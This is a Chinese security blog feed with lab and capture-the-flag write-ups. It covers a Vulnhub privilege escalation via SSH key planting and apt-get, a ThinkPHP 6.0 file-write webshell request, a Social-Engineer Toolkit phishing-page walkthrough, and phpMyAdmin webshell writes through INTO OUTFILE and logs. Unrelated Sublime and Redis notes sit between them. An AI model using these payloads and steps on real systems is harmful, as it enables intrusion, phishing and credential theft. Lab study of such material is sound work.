connectors.sshconn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Main function</span></span><br><span class="line"><span class="string">    Cron job is going to make my work easy peasy</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    configPath = ConfigReader.set_config_path()</span><br><span class="line">    config = ConfigReader.read_config(configPath)</span><br><span class="line">    connections = checker(config)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;FTP&#x27;</span> <span class="keyword">in</span> connections:</span><br><span class="line">        ftpcon(config[<span class="string">&#x27;FTP&#x27;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;SSH&#x27;</span> <span class="keyword">in</span> connections:</span><br><span class="line">            sshcon(config[<span class="string">&#x27;SSH&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;URL&#x27;</span> <span class="keyword">in</span> connections:</span><br><span class="line">                sync(config[<span class="string">&#x27;URL&#x27;</span>], config[<span class="string">&#x27;Output&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><blockquote><p>筛选出的日期格式文件，会把json文件里的URL的内容拷贝到Output里。</p></blockquote><p><a href="https://blog.csdn.net/dongwuming/article/details/9705595">ssh-keygen使用及配置authorized_keys免密登录</a></p><blockquote><p>登录A机器，ssh-keygen -t [rsa|dsa] 会生成密钥文件和私钥文件id_rsa,id_rsa.pub或id_dsa,id_dsa.pub ，这对密钥默认在用户目录的~/.ssh下</p><p>将 .pub 文件复制到B机器的 .ssh 目录， 并 cat id_dsa.pub &gt;&gt; ~/.ssh/authorized_keys</p><p>这样A就可以免密登录B，直接运行ssh B的IP即可。</p></blockquote><p>kali</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~&#x2F;.ssh</span><br><span class="line">cp id_rsa.pub &#x2F;var&#x2F;www&#x2F;html&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure><p>靶机下载私钥id_rsa.pub</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.123&#x2F;id_rsa.pub &gt; &#x2F;home&#x2F;saint&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure><p>按理是应该这样的，但是直接这样没有权限，只能利用crontab来执行</p><p>再根据两个python的源码，在/tmp下新建一个文件名为26-01-2021.config.json</p><p>内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;URL&quot;:&quot;http:&#x2F;&#x2F;192.168.56.123&#x2F;id_rsa.pub&quot;,</span><br><span class="line">        &quot;Output&quot;:&quot;&#x2F;home&#x2F;saint&#x2F;.ssh&#x2F;authorized_keys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后等待3分钟</p><p>kali进行ssh连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh saint@192.168.56.110</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210126100135069.png" alt="image-20210126100135069"></p><p>执行<code>sudo-l</code></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210126100543153.png" alt="image-20210126100543153"></p><p>发现saint用户可以免密执行adduser，添加一个root组的用户</p><p>查看/etc/sudoers文件 检测是否还有别的用户可以执行sudo，但是saint没有root权限，那adduser一个新的用户，使用新用户查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser hacker -gid&#x3D;0</span><br><span class="line">su hacker</span><br></pre></td></tr></table></figure><blockquote><p>必须加个 -gid=0 不然没有root组的权限</p></blockquote><p>现在是hacker用户</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210126101453323.png" alt="image-20210126101453323"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;sudoers</span><br></pre></td></tr></table></figure><p>发现了一个没见过的用户</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210126101732289.png" alt="image-20210126101732289"></p><p>退回到saint,新建 jason 用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser jason -gid&#x3D;0</span><br></pre></td></tr></table></figure><p>上面说了jason的可以运行/usr/bin/apt-get命令，但需要密码，本来就是自己建立的用户，密码也是自己设置的，所以可以执行apt-get来进行提权操作</p><h3 id="apt-get提权"><a href="#apt-get提权" class="headerlink" title="apt-get提权"></a>apt-get提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get changelog apt</span><br><span class="line"></span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210126114827930.png" alt="image-20210126114827930"></p><p>成功提权到root，结束</p><blockquote><p>由于一开始host-only模式下，是连不上外网的</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210126115017225.png" alt="image-20210126115017225"></p><p>解决方法是在靶机上登录，再将网络模式更改为nat模式，地址这时变成10.0.2.15，可以连接百度，这样就可以下载该下载的文件，成功提权</p></blockquote><h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><ul><li>反弹shell主要依赖于flask SSTI漏洞的利用</li><li>提权过程是先找到两个Pyc文件，反编译后发现线索，根据线索写json文件，执行ssh免密登录，根据sudo -l 查看权限操作，添加root组下的用户，查看sudoers文件，再新建一个可以apt-get提权的用户，最后apt-get提权成功</li><li>adduser如果不加 <code>-gid=0</code> 是没有root权限的，一旦忘记，再添加就加不上了，想删除用户也删不掉，因为没有权限，所以无奈只能重装环境重来一遍</li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.aldeid.com/wiki/VulnHub-Djinn-3">https://www.aldeid.com/wiki/VulnHub-Djinn-3</a></p><p><a href="https://blog.csdn.net/weixin_43784056/article/details/107068610">https://blog.csdn.net/weixin_43784056/article/details/107068610</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> 内网提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp 6.x任意文件写入漏洞</title>
      <link href="2023/11/28/thinkphp6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%20%E8%8E%B7%E5%8F%96getshell/"/>
      <url>2023/11/28/thinkphp6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%20%E8%8E%B7%E5%8F%96getshell/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><strong>影响版本</strong>：ThinkPHP 6.0.0 ~ ThinkPHP 6.0.1</p><p><strong>漏洞危害</strong>：任意文件操作，getshell</p><p><strong>官方补丁</strong>：<a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a></p><p><strong>靶机位置</strong>：<a href="https://mituan.zone/#/playground/2c9f843c75e1935a017616e414785472">https://mituan.zone/#/playground/2c9f843c75e1935a017616e414785472</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index&#x2F;vuln?param&#x3D;&lt;?php+@eval($_REQUEST[&#39;pass&#39;]);?&gt; HTTP&#x2F;1.1</span><br><span class="line">Host: e8fe489880064b818843907d097c34fd.app.mituan.zone:8000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko&#x2F;20100101 Firefox&#x2F;83.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;public&#x2F;0000000000x.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201230161059337.png" alt="image-20201230161059337"></p><p><a href="http://2618f3c0f2734d79ab972b3745cb2369.app.mituan.zone:8000/0000000000x.php">http://2618f3c0f2734d79ab972b3745cb2369.app.mituan.zone:8000/0000000000x.php</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105160796/">https://blog.csdn.net/mochu7777777/article/details/105160796/</a></p><p><a href="https://imagin.vip/?p=661">https://imagin.vip/?p=661</a></p><p><a href="https://yanmymickey.github.io/2020/02/25/CTFwp/gyctf_wp/#easy-thinking">https://yanmymickey.github.io/2020/02/25/CTFwp/gyctf_wp/#easy-thinking</a></p><p><a href="https://paper.seebug.org/1114/">https://paper.seebug.org/1114/</a></p><p><a href="https://www.cnblogs.com/0daybug/p/13883330.html">https://www.cnblogs.com/0daybug/p/13883330.html</a></p><p><a href="https://blog.csdn.net/god_zzz/article/details/104275241">https://blog.csdn.net/god_zzz/article/details/104275241</a></p><p><a href="https://blog.csdn.net/zhangchensong168/article/details/104106869">https://blog.csdn.net/zhangchensong168/article/details/104106869</a></p><p><a href="https://zhzhdoai.github.io/2020/01/25/ThinkPHP-6-0-2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%86%99%E5%85%A5-%E8%A6%86%E7%9B%96/">https://zhzhdoai.github.io/2020/01/25/ThinkPHP-6-0-2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%86%99%E5%85%A5-%E8%A6%86%E7%9B%96/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> mitu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Social-Engineer-Toolkit的使用</title>
      <link href="2023/11/28/Social-Engineer-Toolkit%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>2023/11/28/Social-Engineer-Toolkit%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>一、什么是社会工程学</p><p>社会工程学（Social Engineering）在上世纪60年代左右作为正式的学科出现，广义社会工程学的定义是：建立理论并通过利用自然的、社会的和制度上的途径来逐步地解决各种复杂的社会问题。很多企业、公司在信息安全上投入大量的资金，最终导致数据泄露的原因，往往却是发生在人本身。你们可能永远都想象不到，对于黑客们来说，通过一个用户名、一串数字、一串英文代码，社会工程师就可以通过这么几条的线索，通过社工攻击手段，加以筛选、整理，就能把你的所有个人情况信息、家庭状况、兴趣爱好、婚姻状况、你在网上留下的一切痕迹等个人信息全部掌握得一清二楚。虽然这个可能是最不起眼，而且还是最麻烦的方法。一种无需依托任何黑客软件，更注重研究人性弱点的黑客手法正在兴起，这就是社会工程学黑客技术。</p><p>二、Social-Engineering-Toolkit</p><p>Social Engineer Toolkit(SET)工具在一个接口囊括了许多有用的社会工程学攻击。SET的主要目的是自动化并改进社会工程学攻击。它能够自动生成隐藏了EXP的 网页或电子邮件消息，同时还能使用Metasploit的payload，例如网页一旦被打开便会连接shell。</p><p>三、生成钓鱼页面</p><p>1、kali linux 打开工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setoolkit</span><br></pre></td></tr></table></figure><blockquote><ol><li><p>Social-Engineering Attacks(社工工程学攻击)</p></li><li><p>Penetration Testing (Fast-Track)（快速追踪测试）</p></li><li><p>Third Party Modules（第三模块）</p></li><li><p>Update the Social-Engineer Toolkit（升级）</p></li><li><p>Update SET configuration（升级配置）</p></li><li><p>Help, Credits, and About（帮助）</p></li></ol></blockquote><p>2、选择<code>1)Social-Engineering Attacks</code>，进入下一级菜单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set&gt;1</span><br></pre></td></tr></table></figure><blockquote><ol><li><p>Spear-Phishing Attack Vectors(鱼叉式网络钓鱼攻击)</p></li><li><p>Website Attack Vectors（网页攻击）</p></li><li><p>Infectious Media Generator（传染媒介产生器—木马）</p></li><li><p>Create a Payload and Listener（建立pay和监听器）</p></li><li><p>Mass Mailer Attack（邮件群发攻击）</p></li><li><p>Arduino-Based Attack Vector（基于Arduino攻击方式）</p></li><li><p>Wireless Access Point Attack Vector（无线接入攻击）</p></li><li><p>QRCode Generator Attack Vector（二维码攻击）</p></li><li><p>Powershell Attack Vectors（powershell攻击）</p></li><li><p>SMS Spoofing Attack Vector（SMS欺骗攻击）</p></li><li><p>Third Party Modules（第三模块）</p></li></ol></blockquote><p>3、选择<code>2)Website Attack Vectors</code>，进入下一级菜单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set&gt;2</span><br></pre></td></tr></table></figure><blockquote><ol><li><p>Java Applet Attack Method （java applet小程序攻击）</p></li><li><p>Metasploit Browser Exploit Method（MSF 浏览器攻击）</p></li><li><p>Credential Harvester Attack Method（钓鱼网站攻击）</p></li><li><p>Tabnabbing Attack Method（标签钓鱼攻击）</p></li><li><p>Web Jacking Attack Method（网站Jacking 攻击）</p></li><li><p>Multi-Attack Web Method（多站点攻击）</p></li><li><p>Full Screen Attack Method（全屏幕攻击）</p></li><li><p>HTA Attack Method（HTA攻击）</p></li></ol></blockquote><p>4、选择<code>3) Credential Harvester Attack Method</code>，进入下一级菜单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set&gt;webattack:3</span><br></pre></td></tr></table></figure><blockquote><ol><li><p>Web Templates (网站模板)</p></li><li><p>Site Cloner （网站克隆）</p></li><li><p>Custom Import （自定义）</p></li></ol></blockquote><p>5、选择<code>1) Web Templates</code>，进入下一级菜单，出现本机IP，再回车，出现</p><blockquote><ol><li>Java Required</li><li>Google</li><li>Twitter</li></ol></blockquote><p>选择<code>2)Google</code>,生成谷歌登录页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set:webattack&gt;Select a template:2</span><br></pre></td></tr></table></figure><p>按下回车，便开始监听</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 社会工程学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sublime加入右键</title>
      <link href="2023/11/28/sublime%E5%8A%A0%E5%85%A5%E5%8F%B3%E9%94%AE/"/>
      <url>2023/11/28/sublime%E5%8A%A0%E5%85%A5%E5%8F%B3%E9%94%AE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>1、打开注册表，win+R输入<code>regedit</code></p><p>2、在<code>HKEY_CLASSSES_ROOT/ * /Shell</code> 下面找到 <strong>Open with Sublime Text</strong> 没有就在Shell下新建一项</p><p>在Open with Sublime Text这里新建字符串值，命名为<code>Icon</code>，值为”sublime所在路径，0”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\Program Files\Sublime Text 3\sublime_text.exe,0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201232605672.png" alt="image-20210201232605672"></p><p>3、在Open with Sublime Text下面新建项<code>command</code>,默认值为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\Program Files\Sublime Text 3\sublime_text.exe &quot;%1&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201232233213.png" alt="image-20210201232605672"></p><p>不用重启，立马见效</p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201232934877.png" alt="image-20210201232934877" style="zoom:67%;" /><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>由此，应该也可以自己添加自己想要放进右键的软件功能了吧！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis未授权访问漏洞复现</title>
      <link href="2023/11/28/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2023/11/28/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>安装src/redis-cli</p><p>1、wget <a href="https://download.redis.io/releases/redis-6.0.9.tar.gz">https://download.redis.io/releases/redis-6.0.9.tar.gz</a></p><p>2、tar xzf redis-6.0.9.tar.gz</p><p>3、cd redis-6.0.9&amp;&amp;make</p><p>连接redis数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src&#x2F;redis-cli -h &lt;hostname&gt; -p &lt;port&gt;</span><br></pre></td></tr></table></figure><p>然后执行下述命令完成密码验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379 &gt; AUTH &lt;password&gt;</span><br><span class="line">ok</span><br></pre></td></tr></table></figure><p>出现OK说明成功进入</p><p>然后可以输入info查看基本数据库的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379 &gt; info</span><br></pre></td></tr></table></figure><p>查看目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379 &gt; config get dir</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201225152536412.png" alt="image-20201225152536412"></p><p>端口占用如何关闭</p><p>Ncat: bind to :::1111: Address already in use. QUITTING</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -anp | grep 1111</span><br><span class="line">kill -9 &lt;进程&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201225175048131.png" alt="image-20201225175048131"></p>]]></content>
      
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin获取shell</title>
      <link href="2023/11/28/phpmyadmin%E8%8E%B7%E5%8F%96shell/"/>
      <url>2023/11/28/phpmyadmin%E8%8E%B7%E5%8F%96shell/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="查找真实路径"><a href="#查找真实路径" class="headerlink" title="查找真实路径"></a>查找真实路径</h1><h2 id="通过sql语句查询"><a href="#通过sql语句查询" class="headerlink" title="通过sql语句查询"></a>通过sql语句查询</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@basedir;   <span class="comment"># 得到 /usr</span></span><br><span class="line"><span class="keyword">select</span> @@datadir;   <span class="comment"># 得到 /var/lib/mysql</span></span><br></pre></td></tr></table></figure><p>而网站实际根路径是 /var/www</p><h2 id="phpinfo查找真实路径"><a href="#phpinfo查找真实路径" class="headerlink" title="phpinfo查找真实路径"></a>phpinfo查找真实路径</h2><ul><li>_SERVER[“SCRIPT_FILENAME”]</li><li>_SERVER[“DOCUMENT_ROOT”]</li><li>_SERVER[“CONTEXT_DOCUMENT_ROOT”]</li><li>Server Root</li></ul><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210108091912469.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210108091912469.png" alt="image-20210108091912469"></a></p><h2 id="通过log变量查找路径"><a href="#通过log变量查找路径" class="headerlink" title="通过log变量查找路径"></a>通过log变量查找路径</h2><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107130834802.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107130834802.png" alt="image-20210107130834802"></a></p><h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>找到路径后，就要想办法将木马写入</p><h2 id="查询secure-file-priv"><a href="#查询secure-file-priv" class="headerlink" title="查询secure_file_priv"></a>查询secure_file_priv</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@secure_file_priv;   </span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">global</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">&quot;secure_file_priv&quot;</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>值</th><th>解释</th></tr></thead><tbody><tr><td><code>NULL</code>(默认)</td><td>不允许导入导出文件</td></tr><tr><td><code>/tmp</code></td><td>只允许在 <code>/tmp</code> 目录导入导出文件</td></tr><tr><td>空</td><td>不限制路径，可以任意导入导出文件</td></tr></tbody></table><blockquote><p>在我用SHOW global VARIABLES LIKE “secure_file_priv”;执行时没有显示NULL，是空的，按理应该是任意都可导入，但是select @@secure_file_priv; 之后回显NULL，实际操作也是不能导入导出的。在当我在my.cnf只修改secure_file_priv的值为/var/www之后，仍然不能够读取文件，伤脑筋,可能是普通用户权限的原因</p></blockquote><h2 id="select-into-outfile写入"><a href="#select-into-outfile写入" class="headerlink" title="select into outfile写入"></a>select into outfile写入</h2><p>在可以正常读取文件之后，写入shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">&#x27;/var/www/uploaded_images/1.php&#x27;</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">&#x27;/var/www/uploaded_images/1.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这样直接用菜刀连接<a href="http://192.168.56.107/uploaded_images/1.php">http://192.168.56.107/uploaded_images/1.php</a> 即可</p><p>在获取root权限下，修改secure_file_priv的值</p><blockquote><p>只要找到mysql的配置文件，在[mysqld] 下添加条目: secure_file_priv =</p></blockquote><h3 id="配置文件位置"><a href="#配置文件位置" class="headerlink" title="配置文件位置"></a>配置文件位置</h3><p>Windows：<code>C:/mysql/my.ini</code></p><p>Linux：<code>/etc/mysql/my.conf</code></p><h3 id="开启mysql允许远程连接"><a href="#开启mysql允许远程连接" class="headerlink" title="开启mysql允许远程连接"></a>开启mysql允许远程连接</h3><p>1、查看端口是否打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an|grep 3306</span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107152124144.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107152124144.png" alt="image-20210107152124144"></a></p><p>2、打开mysql配置文件 /etc/mysql/my.cnf</p><p>将bind-address = 127.0.0.1注销 “#”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#bind-address&#x3D; 127.0.0.1</span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107151916769.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107151916769.png" alt="image-20210107151916769"></a></p><p>3、然后重启</p><p>4、再次查看端口</p><p>skip-grant-tables</p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107171540335.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107171540335.png" alt="image-20210107171540335"></a></p><p>不用输密码直接登，登进去后把刚才添加的skip-grant-tables删掉</p><p>然后修改密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span></span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span></span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107175205797.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107175205797.png" alt="image-20210107175205797"></a></p><h2 id="利用日志getshell"><a href="#利用日志getshell" class="headerlink" title="利用日志getshell"></a>利用日志getshell</h2><p>当into outfile不能用的时候，可以利用日志getshell，phpmyadmin有一个记录日志的文件，但是一般情况下会关闭，开启日志记录，然后设置日志记录名称为.php，随便执行sql语句，只要包括一句话木马就会被写入到日志中去，然后就可以连接getshell</p><p>mysql5.0版本以上有日志。但是也要对生成的日志有可读可写的权限。</p><p>版本在登录进来时能看到，是5.5.38</p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107131240231.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107131240231.png" alt="image-20210107131240231"></a></p><h3 id="查看日志状态"><a href="#查看日志状态" class="headerlink" title="查看日志状态"></a>查看日志状态</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span>  <span class="keyword">like</span>  <span class="string">&#x27;%general%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107131439941.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107131439941.png" alt="image-20210107131439941"></a></p><blockquote><p>general log 指的是日志保存状态,ON代表开启 OFF代表关闭</p><p>general log file 指的是日志的保存路径</p></blockquote><h3 id="开启日志读写"><a href="#开启日志读写" class="headerlink" title="开启日志读写"></a>开启日志读写</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log=<span class="string">&#x27;on&#x27;</span></span><br></pre></td></tr></table></figure><p>执行发现，权限太低改不了。。。</p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107131837034.png"><img 